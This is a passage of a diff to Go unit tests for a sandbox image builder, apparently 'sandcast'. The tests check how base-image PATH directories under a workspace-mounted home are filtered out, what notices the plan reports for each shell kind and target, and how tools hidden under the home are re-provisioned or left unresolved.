+		RelocationNotice{Kind: NoticeReprovisioned, Subject: "rg", From: "/sandbox/bin/rg", To: "/usr"}.String())
+	assert.Equal(t, "component rg was found only under /sandbox/bin/rg (hidden once the workspace is mounted over the home); no definition or fragment can provision it, so it is unresolved",
+		RelocationNotice{Kind: NoticeHidden, Subject: "rg", From: "/sandbox/bin/rg"}.String())
+}
+
+// TestBuildShFallbackNotice checks a login shell that is neither zsh nor
+// bash yields the minimal default and the notice that says so (FR-011).
+func TestBuildShFallbackNotice(t *testing.T) {
+	m := testManifest()
+	m.Shell = nil
+	m.Components = []manifest.ComponentRef{{Key: "git"}}
+	in := testInputs(t, m, nil)
+	in.Probe.Facts.Shells = []string{"/bin/sh"}
+	p, err := Build(in)
+	require.NoError(t, err)
+	require.Equal(t, "sh", ShellKind(p))
+	assert.Contains(t, p.Notices, "the login shell is neither zsh nor bash; the image uses /bin/sh with a minimal baked default (/etc/profile.d/sandcast.sh) and the curated shell is not applied")
+}
+
+// TestBakedPathsPerShellKind checks the guard sees the files each shell kind
+// bakes, and the OpenShell hooks only for the OpenShell target.
+func TestBakedPathsPerShellKind(t *testing.T) {
+	paths := func(p *Plan) []string {
+		var out []string
+		for _, bp := range bakedPaths(p, nil) {
+			out = append(out, bp.path)
+		}
+		return out
+	}
+	zsh := paths(&Plan{Target: manifest.TargetOpenShell, Shell: Shell{Program: "zsh", RCPath: ZshRCPath}})
+	assert.Subset(t, zsh, append(slices.Clone(ZshEnvPaths), ZDotDir, ZshRCPath, LoginHookPath, RedirectHome))
+	bash := paths(&Plan{Target: manifest.TargetOpenShell, Shell: Shell{Program: "bash"}})
+	assert.Subset(t, bash, []string{ShellLoginPath, BashRCPath, LoginHookPath})
+	assert.NotContains(t, bash, ZDotDir)
+	sh := paths(&Plan{Target: manifest.TargetContainer, Shell: Shell{Program: "none"}})
+	assert.Equal(t, []string{ProfileScriptPath, ShLoginPath}, sh, "no hooks for the container target")
+	withAll := paths(&Plan{Target: manifest.TargetContainer, Shell: Shell{Program: "none"},
+		Dotfiles: []DotfileSelection{{RelocatedTo: GitConfigPath}}, Image: ImageSetup{Dirs: []Dir{{Path: "/opt/go"}}}})
+	assert.Subset(t, withAll, []string{GitConfigPath, "/opt/go"})
+	// A bash image whose base image ships zsh gets the zshenv block too, so
+	// a zsh the user starts never reads a workspace .zshrc.
+	withZsh := paths(&Plan{Target: manifest.TargetOpenShell, Shell: Shell{Program: "bash"}, ImageFacts: ImageFacts{Shells: []string{"/bin/bash", "/usr/bin/zsh"}}})
+	assert.Subset(t, withZsh, append(slices.Clone(ZshEnvPaths), ZDotDir))
+}
+
+// TestHomeRCNotices checks the home rc notice is reported for the container
+// target only: in OpenShell images no shell reads a startup file from the
+// home, so a base image rc that resets PATH has no effect there.
 func TestHomeRCNotices(t *testing.T) {
 	facts := probe.Facts{User: probe.User{Home: "/sandbox"}, HomeRCResetsPath: []string{".bashrc", ".profile"}}
 	assert.Equal(t, []string{
-		"home-rc-path: image: /sandbox/.bashrc resets PATH; sandcast re-applies the mise shims after it",
-		"home-rc-path: image: /sandbox/.profile resets PATH; sandcast re-applies the mise shims after it",
-	}, homeRCNotices(facts, manifest.TargetOpenShell, true))
-	assert.Contains(t, homeRCNotices(facts, manifest.TargetContainer, true)[0], "bash sessions that read it lose the directories")
-	assert.Contains(t, homeRCNotices(facts, manifest.TargetOpenShell, false)[0], "bash sessions that read it lose the directories", "nothing re-applies shims without mise")
-	assert.Empty(t, homeRCNotices(probe.Facts{}, manifest.TargetOpenShell, true))
+		"home-rc-path: image: /sandbox/.bashrc resets PATH; bash sessions that read it lose the directories set before it",
+		"home-rc-path: image: /sandbox/.profile resets PATH; bash sessions that read it lose the directories set before it",
+	}, homeRCNotices(facts, manifest.TargetContainer))
+	assert.Empty(t, homeRCNotices(facts, manifest.TargetOpenShell), "no OpenShell session reads a home rc file")
+	assert.Empty(t, homeRCNotices(probe.Facts{}, manifest.TargetContainer))
 }
 
-// TestHomeRCNoticesSkippedForCreatedUser: the probed rc files belong to the
-// base image user's home; a root base image gets a created final user with
-// another home, so the plan reports none of them.
-func TestHomeRCNoticesSkippedForCreatedUser(t *testing.T) {
-	in := testInputs(t, testManifest(), nil)
+// TestHomeRCNoticesPerTarget: the container target keeps the base image
+// user, whose rc files a directly started bash reads, so the plan reports
+// each one that resets PATH; the OpenShell target reports none, because no
+// shell there reads a home rc file (the probe fact stays in the image
+// facts). A created final user never applies: only the OpenShell target
+// creates one.
+func TestHomeRCNoticesPerTarget(t *testing.T) {
+	m := testManifest()
+	m.Targets = manifest.Targets{Container: &manifest.Target{Image: "localhost/demo"}}
+	in := testInputs(t, m, nil)
+	in.Target = manifest.TargetContainer
 	p, err := Build(in)
 	require.NoError(t, err)
-	assert.Contains(t, strings.Join(p.Notices, "\n"), "home-rc-path: image: /sandbox/.bashrc")
+	require.False(t, p.FinalUser.Created)
+	assert.Contains(t, strings.Join(p.Notices, "\n"), "home-rc-path: image: /sandbox/.bashrc resets PATH; bash sessions that read it lose the directories set before it")
 
-	in = testInputs(t, testManifest(), nil)
-	in.Probe.Facts.User = probe.User{Name: "root", UID: 0, GID: 0, Group: "root", Home: "/root", Shell: "/bin/bash"}
-	p, err = Build(in)
+	p, err = Build(testInputs(t, testManifest(), nil))
 	require.NoError(t, err)
-	require.True(t, p.FinalUser.Created)
-	assert.NotContains(t, strings.Join(p.Notices, "\n"), "home-rc-path")
+	assert.Equal(t, []string{".bashrc"}, p.ImageFacts.HomeRCResetsPath, "the fact is kept")
+	assert.NotContains(t, strings.Join(p.Notices, "\n"), "home-rc-path", "no notice for the OpenShell target")
 }
 
 func TestFactsOfCopiesHomeRCResetsPath(t *testing.T) {
@@ -666,4 +1234,178 @@ func TestDeclaredBins(t *testing.T) {
 	require.NoError(t, err)
 	require.Len(t, p.Conflicts, 1)
 	assert.Equal(t, component.Conflict{Binary: "git", Components: []string{"git", "my-git"}}, p.Conflicts[0])
+}
+
+// TestBuildHiddenSessionPathDirNotice checks a base image PATH directory
+// under the overmount home never reaches the session environment script
+// (P1 of the reconciliation review: the workspace mounted there may come
+// from an untrusted project, and Ubuntu's system bashrc calls groups by
+// name) nor the image PATH that the OpenShell default agent inherits (I1 of
+// the round 2 review), and that the plan says so once per directory; a
+// directory outside the home is kept, in the base image's order, and the
+// container target reports nothing and keeps the base image's PATH.
+func TestBuildHiddenSessionPathDirNotice(t *testing.T) {
+	in := testInputs(t, testManifest(), nil)
+	in.Probe.Facts.Path = []string{"/sandbox/.venv/bin", "/usr/local/bin", "/usr/bin", "/bin", "/sandbox/.local/bin", "/usr/local/go/bin"}
+	p, err := Build(in)
+	require.NoError(t, err)
+	assert.Contains(t, p.Notices, "workspace-path: image: base image PATH directory /sandbox/.venv/bin lies under the overmount home /sandbox and is left out of the image PATH and the session PATH; a tool there is hidden once the workspace is mounted, and a virtual environment there joins the PATH only when it is activated (a tool that reads VIRTUAL_ENV from the image environment may use it regardless)")
+	assert.Contains(t, strings.Join(p.Notices, "\n"), "/sandbox/.local/bin lies under the overmount home")
+	assert.Equal(t, 1, strings.Count(strings.Join(p.Notices, "\n"), "/sandbox/.venv/bin lies under"), "once per directory")
+	script := SessionEnvScriptFor(p)
+	assert.NotContains(t, script, "/sandbox/.venv/bin")
+	assert.NotContains(t, script, "/sandbox/.local/bin")
+	assert.Contains(t, script, "/usr/local/go/bin")
+	assert.Contains(t, p.Image.Env, EnvVar{Name: "PATH", Value: "/usr/local/bin:/usr/bin:/bin:/usr/local/go/bin"}, "the image PATH without the hidden directories")
+
+	m := testManifest()
+	m.Targets = manifest.Targets{Container: &manifest.Target{Image: "localhost/demo"}}
+	cin := testInputs(t, m, nil)
+	cin.Target = manifest.TargetContainer
+	cin.Probe.Facts.Path = in.Probe.Facts.Path
+	cp, err := Build(cin)
+	require.NoError(t, err)
+	assert.NotContains(t, strings.Join(cp.Notices, "\n"), "is left out of the image PATH", "no overmount on the container target")
+	for _, e := range cp.Image.Env {
+		assert.NotEqual(t, "PATH", e.Name, "the container target keeps the base image's PATH")
+	}
+}
+
+// TestSetImagePath pins the image PATH rule: nothing without an overmount
+// home or when no base PATH directory lies under it (the image keeps the
+// base image's PATH); otherwise the base PATH without those directories, in
+// order and without duplicates, the OpenShell default PATH when nothing is
+// left, and a component or harness PATH replaced with a notice.
+func TestSetImagePath(t *testing.T) {
+	set := func(setup *ImageSetup, basePath []string, overmount string) (notices, hidden []string) {
+		t.Helper()
+		return setImagePath(setup, basePath, overmount)
+	}
+	setup := ImageSetup{Env: []EnvVar{{Name: "GOPATH", Value: "/opt/go"}}}
+	notices, hidden := set(&setup, []string{"/sandbox/.venv/bin", ".", "/usr/bin"}, "")
+	assert.Empty(t, notices)
+	assert.Empty(t, hidden)
+	assert.Equal(t, []EnvVar{{Name: "GOPATH", Value: "/opt/go"}}, setup.Env, "no overmount home: untouched")
+	notices, hidden = set(&setup, []string{"/usr/local/bin", "/usr/bin", "/bin"}, "/sandbox")
+	assert.Empty(t, notices)
+	assert.Empty(t, hidden)
+	assert.Equal(t, []EnvVar{{Name: "GOPATH", Value: "/opt/go"}}, setup.Env, "a clean base PATH: untouched")
+
+	// Entries under the overmount home and entries that are not absolute
+	// (relative, tilde, empty) go; the rest keeps its order, once each.
+	notices, hidden = set(&setup, []string{"/sandbox/.venv/bin", "~/.local/bin", "/usr/local/bin", ".", "/usr/bin/", "", "bin", "/usr/local/bin", "/sandbox", "/bin", "/sandboxes/bin"}, "/sandbox")
+	assert.Empty(t, notices, "a base image PATH is rewritten without a notice; the plan reports the hidden entries")
+	assert.Equal(t, []string{"/sandbox/.venv/bin", "~/.local/bin", ".", "bin", "/sandbox"}, hidden)
+	assert.Equal(t, []EnvVar{{Name: "GOPATH", Value: "/opt/go"}, {Name: "PATH", Value: "/usr/local/bin:/usr/bin:/bin:/sandboxes/bin"}}, setup.Env)
+
+	setup = ImageSetup{}
+	_, hidden = set(&setup, []string{"/sandbox/.venv/bin", "/sandbox/bin"}, "/sandbox")
+	assert.Equal(t, []string{"/sandbox/.venv/bin", "/sandbox/bin"}, hidden)
+	assert.Equal(t, []EnvVar{{Name: "PATH", Value: strings.Join(OpenShellDefaultPath, ":")}}, setup.Env, "nothing left: the OpenShell default PATH")
+
+	// A component or harness PATH is the PATH the image ends up with: its
+	// $PATH entry stands for the base image's PATH, its own directories
+	// outside the home are kept, and the change is reported.
+	setup = ImageSetup{Env: []EnvVar{{Name: "PATH", Value: "/opt/tool/bin:$PATH"}}}
+	notices, hidden = set(&setup, []string{"/sandbox/.venv/bin", "/usr/bin", "/bin"}, "/sandbox")
+	assert.Equal(t, []string{"component or harness env PATH=/opt/tool/bin:$PATH is replaced by the image PATH /opt/tool/bin:/usr/bin:/bin, which leaves out the entries under the overmount home /sandbox and the entries that are not absolute"}, notices)
+	assert.Equal(t, []string{"/sandbox/.venv/bin"}, hidden)
+	assert.Equal(t, []EnvVar{{Name: "PATH", Value: "/opt/tool/bin:/usr/bin:/bin"}}, setup.Env)
+	// A component PATH that names the home on a clean base is filtered too.
+	setup = ImageSetup{Env: []EnvVar{{Name: "PATH", Value: "/sandbox/.local/bin:${PATH}"}}}
+	notices, hidden = set(&setup, []string{"/usr/bin", "/bin"}, "/sandbox")
+	assert.Len(t, notices, 1)
+	assert.Equal(t, []string{"/sandbox/.local/bin"}, hidden)
+	assert.Equal(t, []EnvVar{{Name: "PATH", Value: "/usr/bin:/bin"}}, setup.Env)
+	// A clean component PATH on a dirty base stays as it is: it never
+	// included the base image's entries.
+	setup = ImageSetup{Env: []EnvVar{{Name: "PATH", Value: "/opt/tool/bin:/usr/bin:/bin"}}}
+	notices, hidden = set(&setup, []string{"/sandbox/.venv/bin", "/usr/bin", "/bin"}, "/sandbox")
+	assert.Empty(t, notices)
+	assert.Empty(t, hidden)
+	assert.Equal(t, []EnvVar{{Name: "PATH", Value: "/opt/tool/bin:/usr/bin:/bin"}}, setup.Env)
+
+	assert.Equal(t, "base image PATH entry . is not absolute and would resolve from the working directory or the home, the mounted workspace in a session; it is left out of the image PATH and the session PATH", hiddenPathReason(".", "/sandbox"))
+	assert.Contains(t, hiddenPathReason("/sandbox/.venv/bin", "/sandbox"), "base image PATH directory /sandbox/.venv/bin lies under the overmount home /sandbox and is left out of the image PATH and the session PATH")
+}
+
+// TestBuildRefusesSessionPathMarker: the once-per-session marker of the
+// session environment script must never be part of the image environment,
+// or the default agent's session would skip the strip of the inherited
+// PATH; a component that sets it fails the plan on the OpenShell target.
+func TestBuildRefusesSessionPathMarker(t *testing.T) {
+	in := testInputs(t, testManifest(), nil)
+	for _, w := range in.Wanted {
+		if w.Key == "go" {
+			w.Def.Image.Env[SessionPathMarker] = "1"
+		}
+	}
+	_, err := Build(in)
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "image env SANDCAST_PATH_STRIPPED is reserved")
+}
+
+// TestBuildWorkspaceRuleMixedAndMultiHit covers the workspace rule at the
+// plan level (D6 of the reconciliation): a tool with hits under and outside
+// the overmount home is shadowed with the workspace-path and unknown-version
+// notices and no relocation notice, and a tool whose every hit lies under
+// the home is re-provisioned with a relocation notice that names them all.
+func TestBuildWorkspaceRuleMixedAndMultiHit(t *testing.T) {
+	in := testInputs(t, testManifest(), nil)
+	in.Probe.Checks["go"] = probe.CheckResult{ComponentKey: "go", Status: probe.StatusPresent, Version: "1.25.0", Path: "/sandbox/go/bin/go", Paths: []string{"/sandbox/go/bin/go", "/usr/local/go/bin/go"}}
+	p, err := Build(in)
+	require.NoError(t, err)
+	assert.Equal(t, ActionShadow, p.Component("go").Action)
+	for _, r := range p.Relocations {
+		assert.NotEqual(t, NoticeReprovisioned, r.Kind, "a mixed tool is not re-provisioned: %+v", r)
+	}
+	joined := strings.Join(p.Notices, "\n")
+	assert.Contains(t, joined, "workspace-path: go: first PATH hit /sandbox/go/bin/go lies under the overmount home /sandbox and is ignored; /usr/local/go/bin/go decides")
+	assert.Contains(t, joined, "unknown-version: go: the probed version came from the ignored copy under the overmount home; installing locked")
+
+	in = testInputs(t, testManifest(), nil)
+	in.Probe.Checks["go"] = probe.CheckResult{ComponentKey: "go", Status: probe.StatusPresent, Version: "1.25.0", Path: "/sandbox/go/bin/go", Paths: []string{"/sandbox/go/bin/go", "/sandbox/.local/bin/go"}}
+	p, err = Build(in)
+	require.NoError(t, err)
+	assert.Equal(t, ActionInstall, p.Component("go").Action)
+	var found bool
+	for _, r := range p.Relocations {
+		if r.Kind == NoticeReprovisioned && r.Subject == "go" {
+			found = true
+			assert.Equal(t, "/sandbox/go/bin/go, /sandbox/.local/bin/go", r.From, "every hidden hit is named")
+			assert.Equal(t, MiseDataDir, r.To)
+		}
+	}
+	assert.True(t, found, "a tool hidden at every hit is re-provisioned: %v", p.Relocations)
+	assert.NotContains(t, strings.Join(p.Notices, "\n"), "workspace-path: go:")
+}
+
+// TestBuildHiddenToolUnresolvedOrFragment checks what the plan reports for
+// a hidden tool that no definition can install: it is unresolved, and the
+// relocation notice has the hidden kind, no destination, and says so
+// (contracts/relocation-notice.md); with a stored fragment the tool is
+// re-provisioned and the destination is the fragment's /opt tree.
+func TestBuildHiddenToolUnresolvedOrFragment(t *testing.T) {
+	m := testManifest()
+	m.Components = append(m.Components, manifest.ComponentRef{Key: "git"})
+	in := testInputs(t, m, nil)
+	in.Probe.Facts.PackageManager = PackageManagerNone
+	in.Probe.Checks["git"] = probe.CheckResult{ComponentKey: "git", Status: probe.StatusPresent, Version: "2.43.0", Path: "/sandbox/bin/git", Paths: []string{"/sandbox/bin/git"}}
+	p, err := Build(in)
+	require.NoError(t, err)
+	require.True(t, slices.ContainsFunc(p.Unresolved, func(u Unresolved) bool { return u.Key == "git" }), "git is unresolved: %+v", p.Unresolved)
+	assert.Contains(t, p.Notices, "component git was found only under /sandbox/bin/git (hidden once the workspace is mounted over the home); no definition or fragment can provision it, so it is unresolved")
+	i := slices.IndexFunc(p.Relocations, func(r RelocationNotice) bool { return r.Subject == "git" })
+	require.GreaterOrEqual(t, i, 0, "a relocation notice for git: %+v", p.Relocations)
+	assert.Equal(t, RelocationNotice{Kind: NoticeHidden, Subject: "git", From: "/sandbox/bin/git"}, p.Relocations[i], "the hidden kind, without a destination")
+
+	in = testInputs(t, m, map[string]StoredFragment{"git": {Key: "git", Source: ".sandcast/fragments/git.containerfile", Body: "USER root\nRUN echo git\n"}})
+	in.Probe.Facts.PackageManager = PackageManagerNone
+	in.Probe.Checks["git"] = probe.CheckResult{ComponentKey: "git", Status: probe.StatusPresent, Version: "2.43.0", Path: "/sandbox/bin/git", Paths: []string{"/sandbox/bin/git"}}
+	p, err = Build(in)
+	require.NoError(t, err)
+	assert.Contains(t, p.Notices, "component git was found only under /sandbox/bin/git (hidden once the workspace is mounted over the home); it is provisioned to /opt/git instead")
+	i = slices.IndexFunc(p.Relocations, func(r RelocationNotice) bool { return r.Subject == "git" })
+	require.GreaterOrEqual(t, i, 0)
+	assert.Equal(t, RelocationNotice{Kind: NoticeReprovisioned, Subject: "git", From: "/sandbox/bin/git", To: "/opt/git"}, p.Relocations[i])
 }
